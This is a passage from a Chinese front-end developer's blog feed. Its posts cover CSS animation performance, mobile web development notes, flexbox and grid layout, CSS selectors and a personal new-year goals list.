<p>硬件加速原理<br><em>渲染树，每个渲染对象都会指定到一个图片层，并作为结构上传到GPU  。是由几个cpmpositor进程处理的。当动画结束，这个层（GPU纹理）会被移除 。</em></p>
<h5 id="动画调优的策略与技巧"><a href="#动画调优的策略与技巧" class="headerlink" title="动画调优的策略与技巧"></a>动画调优的策略与技巧</h5><p>通过一张图来总结展示一下<br><img src="http://7xklhg.com1.z0.glb.clouddn.com/web-animation-libraries-C2.jpg" alt=""></p>
<ul>
<li>提升每一帧性能（缩短帧时长，提高帧率）<ul>
<li>避免频繁的重排（layout）。</li>
<li>避免大面积的重绘（repaint）。</li>
<li>优化JS运行性能。</li>
</ul>
</li>
<li><p>保证帧率平稳（避免跳帧）</p>
<ul>
<li>不在连续的动画过程中做高耗时的操作（如大面积重绘、重排、复杂JS执行），避免发生跳帧。</li>
<li>若高耗时操作无法避免，则尝试化解，比如：<ul>
<li>将高耗时操作放在动画开始或结尾处。</li>
<li>将高耗时操作分摊至动画的每一帧中处理。</li>
</ul>
</li>
</ul>
</li>
</ul>
<ul>
<li>针对硬件加速渲染通道的优化<ul>
<li>通过层的变化效果(如transform)实现位移、缩放等动画，可避免重绘。</li>
<li>合理划分层，动静分离，可避免大面积重绘。</li>
<li>使用分层优化动画时，需要留意内存消耗情况（通过Safari调试工具）。</li>
</ul>
</li>
</ul>
<h5 id="如何提高移动端动画体验"><a href="#如何提高移动端动画体验" class="headerlink" title="如何提高移动端动画体验"></a>如何提高移动端动画体验</h5><p>1、移动端直接GPU来加载动画的,如3D变形</p>
<pre><code>transform: translate3d(0, 0, 0);  
</code></pre><p>2、每个设备的GPU渲染最好是在60fps(frames per second)以下。因为浏览器<br>3、使用良好支撑GPU的css属性</p>
<ul>
<li>opacity</li>
<li>translate</li>
<li>rotate</li>
<li>scale</li>
</ul>
<p>4、使用transform hack来加速硬件</p>
<pre><code>//当有闪烁的时候
-webkit-backface-visibility: hidden;
backface-visibility: hidden;

-webkit-perspective: 1000;
perspective: 1000;    

//使用translate3d代替position:left||right 进行位移
</code></pre><p>5、少使用box-shadows与gradients<br>6、尽可能的让动画元素不在文档流中，以减少重排，用到z-index<br>7、优化DOM layout性能<br>批量访问和更新DOM，减少操作、layout thrashing</p>
<pre><code>top = element.style.top;  //访问
left = element.style.left; //访问

element.style.top = top + 10; //更新
element.style.left = left + 10;  //更新
</code></pre><p>8、js方面避免setTimeout,setTimeInterval。</p>
<p>9、使用3D硬件加速时，添加z-index人为干扰复合层排序，减少浏览器创建不必要的复合层，提高渲染性能</p>
<h5 id="影响重排属性（物理结构改变的属性）"><a href="#影响重排属性（物理结构改变的属性）" class="headerlink" title="影响重排属性（物理结构改变的属性）"></a>影响重排属性（物理结构改变的属性）</h5><table>
<thead>
<tr>
<th style="text-align:left">1</th>
<th style="text-align:left">2</th>
<th style="text-align:left">3</th>
<th style="text-align:left">4</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">width</td>
<td style="text-align:left">height</td>
<td style="text-align:left">padding</td>
<td style="text-align:left">margin</td>
</tr>
<tr>
<td style="text-align:left">display</td>
<td style="text-align:left">border-width</td>
<td style="text-align:left">border</td>
<td style="text-align:left">top</td>
</tr>
<tr>
<td style="text-align:left">position</td>
<td style="text-align:left">font-size</td>
<td style="text-align:left">float</td>
<td style="text-align:left">text-align</td>
</tr>
<tr>
<td style="text-align:left">overflow-y</td>
<td style="text-align:left">font-weight</td>
<td style="text-align:left">overflow</td>
<td style="text-align:left">left</td>
</tr>
<tr>
<td style="text-align:left">font-family</td>
<td style="text-align:left">line-height</td>
<td style="text-align:left">vertical-align</td>
<td style="text-align:left">right</td>
</tr>
<tr>
<td style="text-align:left">clear</td>
<td style="text-align:left">white-space</td>
<td style="text-align:left">bottom</td>
<td style="text-align:left">min-height</td>
</tr>
</tbody>
</table>
<h5 id="影响重绘属性（一些外表样式上的属性-皮肤）"><a href="#影响重绘属性（一些外表样式上的属性-皮肤）" class="headerlink" title="影响重绘属性（一些外表样式上的属性-皮肤）"></a>影响重绘属性（一些外表样式上的属性-皮肤）</h5><table>
<thead>
<tr>
<th style="text-align:left">1</th>
<th style="text-align:left">2</th>
<th style="text-align:left">3</th>
<th style="text-align:left">4</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">color</td>
<td style="text-align:left">border-style</td>
<td style="text-align:left">visibility</td>
<td style="text-align:left">background</td>
</tr>
<tr>
<td style="text-align:left">text-decoration</td>
<td style="text-align:left">background-image</td>
<td style="text-align:left">background-position</td>
<td style="text-align:left">background-repeat</td>
</tr>
<tr>
<td style="text-align:left">outline-color</td>
<td style="text-align:left">outline</td>
<td style="text-align:left">outline-style</td>
<td style="text-align:left">border-radius</td>
</tr>
<tr>
<td style="text-align:left">outline-width</td>
<td style="text-align:left">box-shadow</td>
<td style="text-align:left">background-size</td>
</tr>
</tbody>
</table>
<h5 id="动画API"><a href="#动画API" class="headerlink" title="动画API"></a>动画API</h5><ul>
<li>requestAnimationFrame： RAF机制<br><del>作用类似setTimeout(fn,0),但是它能让所有的DOM在下一个frame中运行</del><br>准确来说，它的功能类似underscore中的 throttle(节流)。当我们在浏览器中加载动画时，它是一个起到让动画流畅的保证。(PS：IE9不支持)<ul>
<li>requestAnimationFrame 会把每一帧中的所有DOM操作集中起来，在一次重绘或回流中就完成，并且重绘或回流的时间间隔紧紧跟随浏览器的刷新频率，一般来说，这个频率为每秒60帧。</li>
<li>在隐藏或不可见的元素中，requestAnimationFrame将不会进行重绘或回流，这当然就意味着更少的的cpu，gpu和内存使用量。</li>
</ul>
</li>
</ul>
<p><a href="http://jsbin.com/ebicuJu/2/edit?js,output" target="_blank" rel="external">requestAnimationFrame实例</a>：是否使用requestAnimationFrame的差别</p>
<pre><code>var h1 = element.clientHeight;
requestAnimationFrame(function(){
    element.style.height = (h1 * 2)+ &apos;px&apos;;
    var height = element1.clientHeight;
});
</code></pre><ul>
<li><p>监听 transitionend</p>
<pre><code>var box = document.querySelector(&quot;.box&quot;);
box.addEventListener(&apos;transitionend&apos;, onTransitionEnd , flase);

function onTransitionEnd(){
    //handle the transition
}
</code></pre></li>
</ul>
<h5 id="动画库"><a href="#动画库" class="headerlink" title="动画库"></a>动画库</h5><ul>
<li>velocity.js</li>
<li>animation.css</li>
<li><a href="http://greensock.com/gsap" target="_blank" rel="external">GSAP</a><ul>
<li>比jquery快20倍，移动设备上也很流畅</li>
<li>兼容性良好，完爆<h5 id="学习资源"><a href="#学习资源" class="headerlink" title="学习资源"></a>学习资源</h5></li>
</ul>
</li>
<li><a href="http://alexorz.github.io/animation-performance-guide/" target="_blank" rel="external">http://alexorz.github.io/animation-performance-guide/</a></li>
<li><a href="http://www.paulirish.com/2012/why-moving-elements-with-translate-is-better-than-posabs-topleft/" target="_blank" rel="external">http://www.paulirish.com/2012/why-moving-elements-with-translate-is-better-than-posabs-topleft/</a></li>
<li><a href="http://www.html5rocks.com/en/tutorials/speed/high-performance-animations/" target="_blank" rel="external">http://www.html5rocks.com/en/tutorials/speed/high-performance-animations/</a></li>
<li><a href="http://www.awwwards.com/web-animation-infographics-a-map-of-the-best-animation-libraries-for-javascript-and-css3-plus-performance-tips.html" target="_blank" rel="external">http://www.awwwards.com/web-animation-infographics-a-map-of-the-best-animation-libraries-for-javascript-and-css3-plus-performance-tips.html</a></li>
<li><a href="https://davidwalsh.name/css-js-animation" target="_blank" rel="external">https://davidwalsh.name/css-js-animation</a></li>
<li><a href="http://www.html5rocks.com/zh/tutorials/speed/layers/" target="_blank" rel="external">http://www.html5rocks.com/zh/tutorials/speed/layers/</a></li>
<li><a href="https://css-tricks.com/debouncing-throttling-explained-examples/" target="_blank" rel="external">debounce,throttle,rAF</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;动画与性能&quot;&gt;&lt;a href=&quot;#动画与性能&quot; class=&quot;headerlink&quot; title=&quot;动画与性能&quot;&gt;&lt;/a&gt;动画与性能&lt;/h3&gt;&lt;p&gt;  在前端的活动开发中经常会遇到动画。在pc端往往看到的“正常”的动画在移动端却不正常。有的会出现“卡顿”和闪烁的现象。&lt;br&gt;  在了解动画之前，首先了解一些概念&lt;/p&gt;
&lt;h4 id=&quot;动画名词概念&quot;&gt;&lt;a href=&quot;#动画名词概念&quot; class=&quot;headerlink&quot; title=&quot;动画名词概念&quot;&gt;&lt;/a&gt;动画名词概念&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;帧： 在动画过程中，每一幅静止画面即为一“帧”&lt;/li&gt;
&lt;li&gt;帧率：即每秒钟播放的静止画面的数量，单位是fps(Frame per second)&lt;/li&gt;
&lt;li&gt;帧时长：即每一幅静止画面的停留时间，单位一般是ms(毫秒)&lt;/li&gt;
&lt;li&gt;跳帧(掉帧/丢帧)：在帧率固定的动画中，某一帧的时长远高于平均帧时长，导致其后续数帧被挤压而丢失的现象&lt;/li&gt;
&lt;li&gt;图层：用html片段放置在常规页面的页面。&lt;a href=&quot;http://www.echoecho.com/csslayers.htm&quot;&gt;css layers&lt;/a&gt; 通过z-index属性来控制重叠的顺序。 常见的层模型有 relative 和 absolute(fixed)等几种。&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id=&quot;合成层-图层&quot;&gt;&lt;a href=&quot;#合成层-图层&quot; class=&quot;headerlink&quot; title=&quot;合成层(图层)&quot;&gt;&lt;/a&gt;合成层(图层)&lt;/h5&gt;&lt;p&gt; 那么动画是如何播放的，我们就涉及到了合成层。每个合成层对应了一个GPU纹理，所以它和内存息息相关。在超过一定范围，可能引起浏览器崩溃，观察数量是我们了解的最直接的方法。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;chrome？&lt;br&gt;其中chrome有很多层，包括了RenderLayer(负责 DOM 子树)，GraphicsLayer(负责 RenderLayer 的子树)。&lt;br&gt;chrome中如何显示层，打开chrome://flags/#composited-layer-borders启用，然后打开开发工具勾选Show composited layer borders。&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="blog" scheme="http://blog.zchub.cn/categories/blog/"/>
    
    
      <category term="css3" scheme="http://blog.zchub.cn/tags/css3/"/>
    
      <category term="animation" scheme="http://blog.zchub.cn/tags/animation/"/>
    
      <category term="performance" scheme="http://blog.zchub.cn/tags/performance/"/>
    
  </entry>
  
  <entry>
    <title>移动端web思考</title>
    <link href="http://blog.zchub.cn/2016/01/19/%E7%A7%BB%E5%8A%A8%E7%AB%AFweb%E6%80%9D%E8%80%83/"/>
    <id>http://blog.zchub.cn/2016/01/19/移动端web思考/</id>
    <published>2016-01-19T07:56:29.000Z</published>
    <updated>2016-09-25T03:11:05.036Z</updated>
    
    <content type="html"><![CDATA[<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>做移动端也已经快两个月了，东西不能算是学得很多,而且也没有着手项目，主要负责的是活动的开发，我们主要是在微信开发，然后app中植入h5页面。所以，期间对webapp最大的感受就是页面内容比较少，但是设计到兼容性的比较多。</p>
<p>这当中有几个问题。</p>
<a id="more"></a>
<p>1.图片大小，太大如何解决</p>
<p>一走来，便是切图。各种jpng－&gt;png（为了消除背景，说实话，自己也挺笨的，开发了几个后才知道如何做！不知道之前是怎么搞的），然后便是使用压缩软件，（虽然gulp有压缩图片的功能）。但是公司使用的是cdn，需要上传。这个便是让我蛋疼的地方。但凡每次运营改了东西，都要经过好多个步骤才能shut down。（现在也没想到好的办法！）</p>
<p>另外一个就是图片大小的问题了，图片太大，对于移动端来说下载时间久，渲染通过cpu时间也长。 不过webp格式的图片，压缩率也挺不错（目前还在活动中使用），它在chrome上完美支持，但是还有其他的缺点。</p>
<p>=======update=====<br>目前的一些方式</p>
<table>
<thead>
<tr>
<th style="text-align:center">图片格式</th>
<th style="text-align:center">浏览器支持</th>
<th style="text-align:center">使用场景</th>
<th style="text-align:center">优点</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">webp</td>
<td style="text-align:center">Chrome9+、Opera11.5、Android4+</td>
<td style="text-align:center">复杂颜色及形状</td>
<td style="text-align:center">相比png缩减了文件大小</td>
</tr>
<tr>
<td style="text-align:center">svg</td>
<td style="text-align:center">所有(IE8以上-不包括IE8)</td>
<td style="text-align:center">复杂颜色及形状</td>
<td style="text-align:center">简单图形，需要良好的放缩体验，需要动态控制图片特效,矢量图片，不受像素支持</td>
</tr>
<tr>
<td style="text-align:center">bgp</td>
<td style="text-align:center">不支持，需要js解码</td>
<td style="text-align:center">jpeg上需要极限优化的场景</td>
<td style="text-align:center">高压缩比，相同画质比webp更小</td>
</tr>
</tbody>
</table>
<p>看来svg+canvas是一种良好的解决方案</p>
<p>2.页面如何自适应</p>
<pre><code>目前手机款式太多，使用相应式不太现实。那么多数应该喝网上taobao移动端的解决方式应该差不多，都是通过rem来进行自适应，并监听viewport大小改变重现设置html的font-size。
</code></pre><p>3.开发类似活动等‘简单’页面，你打算采用什么？框架太重！原生？react？没必要</p>
<p>reactjs在前端如日中天，这款UI组件库，确实比较牛逼。相对于之前的重量级ng学习成本低一点，但是我感觉一点也不简单。而且在开发活动中，我并没有体会到它的亮点。一个页面，几张图片，一两个按钮，确实有点大材小用。</p>
<p>之前使用react代码的行数差不多19000+，（惊呆了）所以，最近，我们打算不使用这个来开发活动页面。还是重归zepto的怀抱，目前就（3000+行，大瘦身）。</p>
<p>======update 2016/3/3=======<br>最近在看新人文档中，看到了天猫开发活动（同事是阿里的）的相关流程。</p>
<p>每个公司在发展到一定阶段，随着工作的重复和需求量增加，我们伟大的技术童鞋都会有解决方式。</p>
<pre><code>TMS －－》基于php的模块搭建系统 －－》快速活动搭建平台 和 数据投放系统
</code></pre><p>这个肯定也是我们前端的发展趋势，毕竟切图很累（切身感受）</p>
<p>4.如何在项目中提高web的性能</p>
<pre><code>1.静态文件放在cdn,至于.html可以放在ngnix上

2.dns预解析

    也是前几天才听说，最近看《移动首屏优化实践》又见到了。

    ￼&lt;meta http-equiv=&quot;x-dns-prefetch-control&quot; content=&quot;on&quot; /&gt; 
     &lt;link rel=&quot;dns-prefetch&quot; href=&quot;//imagecache.qq.com&quot;&gt; 

3.webpack压缩js,css

4.缓存数据
    &amp;emsp;&amp;emsp;目前没有使用过

5.按需加载资源，预加载

6.图片懒加载
    使用了一次别人写的，感觉计算的方式有问题，不是很好。自己学会实现一个。

7.用户体验－进度条，旋转的菊花，都是很好的
</code></pre><p>=======update(1/21)=====</p>
<p>1.使用node来降低首屏时间<br>后台不一定需要使用node，但是如果设计到数据交互，需要取后台数据。那么我们通过node“直出”来加快显示，这样就不用渲染直接返回。</p>
<p><a href="http://web.jobbole.com/84753/" target="_blank" rel="external">http://web.jobbole.com/84753/</a></p>
<p><a href="http://imweb.io/topic/568b20194c44bcc56092e415" target="_blank" rel="external">图片详细介绍</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;问题&quot;&gt;&lt;a href=&quot;#问题&quot; class=&quot;headerlink&quot; title=&quot;问题&quot;&gt;&lt;/a&gt;问题&lt;/h2&gt;&lt;p&gt;做移动端也已经快两个月了，东西不能算是学得很多,而且也没有着手项目，主要负责的是活动的开发，我们主要是在微信开发，然后app中植入h5页面。所以，期间对webapp最大的感受就是页面内容比较少，但是设计到兼容性的比较多。&lt;/p&gt;
&lt;p&gt;这当中有几个问题。&lt;/p&gt;
    
    </summary>
    
      <category term="blog" scheme="http://blog.zchub.cn/categories/blog/"/>
    
    
      <category term="front-end" scheme="http://blog.zchub.cn/tags/front-end/"/>
    
  </entry>
  
  <entry>
    <title>css3-flex-grid</title>
    <link href="http://blog.zchub.cn/2016/01/16/css3-flex-grid/"/>
    <id>http://blog.zchub.cn/2016/01/16/css3-flex-grid/</id>
    <published>2016-01-16T00:05:01.000Z</published>
    <updated>2016-09-25T03:11:05.036Z</updated>
    
    <content type="html"><![CDATA[<h2 id="css3-flex"><a href="#css3-flex" class="headerlink" title="css3-flex"></a>css3-flex</h2><p>弹性盒子自找工作的时候才知道这个名词，但是并没有怎么深入。今天打算好好研究一下，同时关注一下css3(4)的栅栏布局grid，貌似更强大。</p>
<p>主流的浏览器大多是支持的，    而现在开发移动端web,android4.4以上也是完全支持的。</p>
<p><img src="http://7xklhg.com1.z0.glb.clouddn.com/caniuse-flex.png" alt="http://7xklhg.com1.z0.glb.clouddn.com/caniuse-flex.png"></p>
<a id="more"></a>
<h2 id="flex专业名词"><a href="#flex专业名词" class="headerlink" title="flex专业名词"></a>flex专业名词</h2><ul>
<li>flex item<br>flex子类条目</li>
</ul>
<p>flex-item长度的计算</p>
<p>下面是关于flex-grow、flex-shrink、flex-basis等三个属性在不同值下对应的flex-item的宽度<br>的在线demo，多玩几次就明白了。<br><a href="http://madebymike.com.au/demos/flexbox-tester/" target="_blank" rel="external">http://madebymike.com.au/demos/flexbox-tester/</a></p>
<ul>
<li>flex-grow<br>默认值：0  继承性：无</li>
</ul>
<p>设置或检索弹性盒的扩展比率。根据弹性盒子元素所设置的扩展因子作为比率来分配<b>剩余空间</b>。<br>(PS：一般是 (父容器.width－所有子items.width) / items.length + item.length[每个item的长度])</p>
<ul>
<li><p>flex-basis<br>语法： flex-basis：<length> | <percentage> | auto | content<br>auto：无特定宽度值，取决于其它属性值<br>content：基于内容自动计算宽度,这样情况item为0px</percentage></length></p>
</li>
<li><p>flex-shrink<br>value: number(&gt;0)<br>定义收缩比率，根据设置值来收缩空间，同时元素始终在父元素内部</p>
</li>
<li><p>flex-direction</p>
</li>
</ul>
<p>定义弹性子条目的方向</p>
<pre><code>.container {
  flex-direction: row[行] | row-reverse | column[列] | column-reverse;
}
</code></pre><ul>
<li><p>flex-wrap<br>  当items出现一行放不下的情况，这个属性就有效了。</p>
<p>  .container{</p>
<pre><code>flex-wrap: nowrap[默认值,受元素定义的书写方向的影响] | wrap | wrap-reverse;
</code></pre><p>  }</p>
</li>
<li><p>justify-content<br>  这个属性作用还是挺大的。<br>  调整内容，帮助元素分配剩余空间。当不是所有的子条目都在同一方向上并且都不是弹性的，或者是弹性但是已经达到他们的最大值。</p>
<p>  .container {</p>
<pre><code>justify-content: flex-start | flex-end | center(水平均匀分布) | space-between | space-around;
</code></pre><p>  }</p>
</li>
<li><p>align-item[另外一个重点]<br>  弹性子元素如何在当前垂直线上分布。<br>  .container {</p>
<pre><code>align-items: flex-start | flex-end | center(垂直均匀) | baseline | stretch;
</code></pre><p>  }</p>
</li>
<li><p>flex<br>  flex是flex-grow, [flex-shrink] 和 [flex-basis]的缩写。默认值为 0 1 auto<br>  即我们使用来设置容器为弹性盒子。<br>  .item {</p>
<pre><code>flex: none | [ &lt;&apos;flex-grow&apos;&gt; &lt;&apos;flex-shrink&apos;&gt;? || &lt;&apos;flex-basis&apos;&gt; ]
</code></pre><p>  }</p>
</li>
</ul>
<h2 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h2><p>自适应各种屏幕</p>
<p>##缺点<br>一维的，只能在同一方向上进行布局，所以就水平（horizontal）和垂直两个方向</p>
<p>##使用</p>
<pre><code>xx{
    display: flex;||
    display: inline-flex;(类比inline-block)
}
</code></pre><p>这里将容器设置为弹性盒子，而它的内部的<b>所有元素</b>就变为了弹性子元素</p>
<h2 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h2><p>弹性盒子的布局逻辑</p>
<pre><code>* 多列布局 中的column-*属性对弹性子元素无效。
* float 和 clear 对弹性子元素无效。使用 float 会导致 display 属性计算为 block.
* vertical-align 对弹性子元素的对齐无效。
</code></pre><h2 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h2><p>1.水平垂直居中（简直了）</p>
<pre><code>.vertical-container {
      height: 300px;
      display: -webkit-flex;
      display: flex;
      -webkit-align-items: center;
      align-items: center;
      -webkit-justify-content: center;
      justify-content: center;
}
</code></pre><p>##Grid layout<br>Grid 表格布局 二维布局 相比flex可以对两个方向同时设置，但是浏览器对其支持目前不是很好。</p>
<p><img src="http://7xklhg.com1.z0.glb.clouddn.com/caniuse_grid.png" alt="http://7xklhg.com1.z0.glb.clouddn.com/caniuse_grid.png"></p>
<p>正是由于是二维的，所以我们可以定义行(row)、列(column). 感觉有点类似栅栏布局，不知道bootstrap是不是也是这种思想。</p>
<p>由于网格容器不是块容器，所以部分属性会失效。类似于flex</p>
<h3 id="术语"><a href="#术语" class="headerlink" title="术语"></a>术语</h3><p>1.网格容器(Grid containers)<br>    value: grid || inline-gird</p>
<p>2.网格轨道(Grid Track)<br>    两条相邻的平行网格线中间的区域，就是行（column）与列(row)。可以用来控制高度与宽度。</p>
<p>3.网格线(Grid Lines)<br>    用于来规划网格，起到单元化的作用</p>
<ol>
<li>‘fr’    （fraction of available space）<br> 即所有剩余以设置的元素宽度达到最大后的剩余宽度，网格容器中额外空间<br> 类似flexbox的box</li>
</ol>
<p>5.grid-row-span/grid-column-span</p>
<p>6.grid-template［网格模板］ </p>
<pre><code>允许通过模板定义网格。
</code></pre><ol>
<li><p>grid item(类比flex-item)<br> 都是容器内的单元内容</p>
</li>
<li><p>分层:z-index<br> 在重叠分部分通过z-index来分层</p>
<h2 id="优点-1"><a href="#优点-1" class="headerlink" title="优点"></a>优点</h2><p>让布局(css)和标记语言(html)真正地分离</p>
<p> 网格完全是用css定义的。同时它的子类都不需要重新去定义区域，类名或id。目的轻量、易懂。更关键的是我们不会因为样式破坏其他的布局，现在是越来越期待了。</p>
</li>
</ol>
<p><img src="https://2r4s9p1yi1fa2jd7j43zph8r-wpengine.netdna-ssl.com/files/2015/09/1-zcOcwuBtMoBaUfHHAJPNyg2.png" alt="https://2r4s9p1yi1fa2jd7j43zph8r-wpengine.netdna-ssl.com/files/2015/09/1-zcOcwuBtMoBaUfHHAJPNyg2.png"></p>
<p>同时我们还可以使用媒体查询来响应设备</p>
<h2 id="学习资料"><a href="#学习资料" class="headerlink" title="学习资料"></a>学习资料</h2><ul>
<li><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/CSS_Flexible_Box_Layout/Using_CSS_flexible_boxes" target="_blank" rel="external">https://developer.mozilla.org/zh-CN/docs/Web/CSS/CSS_Flexible_Box_Layout/Using_CSS_flexible_boxes</a></p>
</li>
<li><p><a href="https://css-tricks.com/snippets/css/a-guide-to-flexbox/" target="_blank" rel="external">https://css-tricks.com/snippets/css/a-guide-to-flexbox/</a></p>
</li>
<li><p><a href="http://segmentfault.com/a/1190000002437544" target="_blank" rel="external">http://segmentfault.com/a/1190000002437544</a></p>
</li>
<li><p><a href="https://css-tricks.com/snippets/css/complete-guide-grid/" target="_blank" rel="external">https://css-tricks.com/snippets/css/complete-guide-grid/</a></p>
</li>
<li><p><a href="https://hacks.mozilla.org/2015/09/the-future-of-layout-with-css-grid-layouts/" target="_blank" rel="external">https://hacks.mozilla.org/2015/09/the-future-of-layout-with-css-grid-layouts/</a></p>
</li>
<li><p><a href="http://www.css88.com/book/css/properties/flex" target="_blank" rel="external">http://www.css88.com/book/css/properties/flex</a></p>
</li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;css3-flex&quot;&gt;&lt;a href=&quot;#css3-flex&quot; class=&quot;headerlink&quot; title=&quot;css3-flex&quot;&gt;&lt;/a&gt;css3-flex&lt;/h2&gt;&lt;p&gt;弹性盒子自找工作的时候才知道这个名词，但是并没有怎么深入。今天打算好好研究一下，同时关注一下css3(4)的栅栏布局grid，貌似更强大。&lt;/p&gt;
&lt;p&gt;主流的浏览器大多是支持的，    而现在开发移动端web,android4.4以上也是完全支持的。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xklhg.com1.z0.glb.clouddn.com/caniuse-flex.png&quot; alt=&quot;http://7xklhg.com1.z0.glb.clouddn.com/caniuse-flex.png&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="front-end" scheme="http://blog.zchub.cn/categories/front-end/"/>
    
    
      <category term="css3" scheme="http://blog.zchub.cn/tags/css3/"/>
    
  </entry>
  
  <entry>
    <title>我的2016</title>
    <link href="http://blog.zchub.cn/2016/01/06/newyeargoal_2016/"/>
    <id>http://blog.zchub.cn/2016/01/06/newyeargoal_2016/</id>
    <published>2016-01-06T21:25:28.000Z</published>
    <updated>2016-09-25T03:11:05.036Z</updated>
    
    <content type="html"><![CDATA[<p>曾记得2014也冲动过一次，写下了2014想要完成的目标，但是后来那张纸缺不见了，但是那些目标中还是完成了几个的。现在在新的一年，写下自己的目标，踏踏实实滴过好每一天。</p>
<h4 id="人丑当然多读书"><a href="#人丑当然多读书" class="headerlink" title="人丑当然多读书"></a>人丑当然多读书</h4><a id="more"></a>
<p>自小不是一个喜欢看书的人，但是为了假装自己有内涵，还是要多看看，不过想看的却不知道哪些。上次，为了提高英文阅读水平，买了本《傲慢与偏见》，发现根本看不懂，看来还是中文适合我。<br>想想列下我自己想看的，</p>
<p>=====update====<br>最近发现读英文资料，自己的水平上升了呀！（被逼的感觉真好）</p>
<ul>
<li><p>平凡的世界（只看了一点点，遗憾）<br>====update====<br>  已经看完两册</p>
</li>
<li><p>读史使人明智</p>
</li>
</ul>
<h4 id="身体是革命的本钱"><a href="#身体是革命的本钱" class="headerlink" title="身体是革命的本钱"></a>身体是革命的本钱</h4><p>作为上班族，每天坐的的时间太长，不想以后老的时候各种病。现在逼逼自己，尽量保持健康的作息时间（有时候还是做不到），而且在keep中看到其他各种秀身材，自己也难免冲动。</p>
<h4 id="关于前端"><a href="#关于前端" class="headerlink" title="关于前端"></a>关于前端</h4><p>在这个前端如日中天的季节，前端越是发展的迅猛，我越不知道改如何下手。虽然如今就写写页面 :(。夯实基础，各种html4,css2,dom,js基础。</p>
<h4 id="有机会参加马拉松"><a href="#有机会参加马拉松" class="headerlink" title="有机会参加马拉松"></a>有机会参加马拉松</h4><p>现在上班都是在锻炼，骑车或walk</p>
<p>======update 2016/3/3=======<br>已经报名悦跑圈的3月线上10公里，小鸡冻</p>
<p>======update 2016/3/22=======<br>完整mini马拉松，没有在重庆与他人pk，但更让我明白人生可能就是需要忍受孤独，最后坚持地、自信地走向终点！坐等奖牌</p>
<h4 id="登泰山"><a href="#登泰山" class="headerlink" title="登泰山"></a>登泰山</h4><p>登泰山而小天下，虽然生活在丘陵地带，但是还是想要一睹泰山的雄伟。这个应该是毕业之后的事了。</p>
<p>======update 2016/3/21=======<br>不知是冲动还是内心中的向往，毕业打算去西藏</p>
<h4 id="看海-done"><a href="#看海-done" class="headerlink" title="看海(done)"></a>看海(done)</h4><p>一个人静静旳听的歌，学会享受孤独，看云卷云舒，同时浪花开在脚丫间，想想都觉得开心。(去海南嗨了一波)</p>
<p>同时希望自己保持这种势头，没什么是大不了的。学会正确滴看待自己。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;曾记得2014也冲动过一次，写下了2014想要完成的目标，但是后来那张纸缺不见了，但是那些目标中还是完成了几个的。现在在新的一年，写下自己的目标，踏踏实实滴过好每一天。&lt;/p&gt;
&lt;h4 id=&quot;人丑当然多读书&quot;&gt;&lt;a href=&quot;#人丑当然多读书&quot; class=&quot;headerlink&quot; title=&quot;人丑当然多读书&quot;&gt;&lt;/a&gt;人丑当然多读书&lt;/h4&gt;
    
    </summary>
    
      <category term="blog" scheme="http://blog.zchub.cn/categories/blog/"/>
    
    
      <category term="life" scheme="http://blog.zchub.cn/tags/life/"/>
    
  </entry>
  
  <entry>
    <title>第二章－选择器</title>
    <link href="http://blog.zchub.cn/2016/01/06/css%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97_%E9%80%89%E6%8B%A9%E5%99%A8/"/>
    <id>http://blog.zchub.cn/2016/01/06/css权威指南_选择器/</id>
    <published>2016-01-06T20:17:42.000Z</published>
    <updated>2016-09-25T03:11:05.036Z</updated>
    
    <content type="html"><![CDATA[<p>我认为css的选择器目的就是我们提供了一个快捷的方式，而我们常用的无非就是元素、类、ID等几种选择器，而其他的几种使用的真的是不多。但是在有的情况下使用这些选择器，你会发现效率大大提高。</p>
<p>(PS: 尼玛，才发现之前写过总结过一次)</p>
<h4 id="选择器种类"><a href="#选择器种类" class="headerlink" title="选择器种类"></a>选择器种类</h4><ul>
<li>元素选择器</li>
</ul>
<pre><code>#css代码
div{background:#ccc;}
zc{background:#ccc;}

#html代码
&lt;div&gt;
    &lt;span&gt;这是一段文字&lt;/span&gt;
&lt;/div&gt;
&lt;zc&gt;这是自定义标签&lt;/zc&gt;
</code></pre><p><b>展示如下</b></p>
<zc style="background:#ccc;display:border;">这是自定义标签</zc>

<div style="background:#ccc"><span>这是一段文字</span></div>

<a id="more"></a>
<p>通常这么使用的话，<span style="color:red">整个页面的div</span>元素都会有1个灰色的背景。<br>这里，我貌似重新定义了一个标签 <b>zc</b>,并且还对它设置了样式，但是在查看源码时可以看到是把它放到p标签中，浏览器是把它当作了两个标签解析。</p>
<p>那如何来定义呢？</p>
<pre><code>&lt;html xmlns:zc&gt;
    &lt;head&gt;
        &lt;style&gt;
            zc{background:#ccc;}
        &lt;/style&gt;
    &lt;/head&gt;
    &lt;body&gt;
        &lt;zc&gt;自定义标签&lt;/zc&gt;    
        &lt;zc&gt;自定义标签&lt;/zc&gt;    
    &lt;/body&gt;
&lt;/html&gt;
</code></pre><p>通过这种方式，浏览器就会解析标签，并解析为行内元素。</p>
<ul>
<li>类选择器</li>
</ul>
<pre><code>#css样式
div.zc{
    border:1px solid #ccc;
}

#html代码
&lt;div class=&quot;zc&quot;&gt;类选择器&lt;/div&gt;
</code></pre><p>这样则可以定义所有class为zc的div元素了！通常我们定义同种样式的时候使用得较多，如商品详情页中的每个商品。</p>
<ul>
<li><p>ID选择器</p>
<pre><code>#css样式
div.zc{
    border:1px solid #ccc;
}

#html代码
&lt;div id=&quot;zc&quot;&gt;id选择器1&lt;/div&gt;    
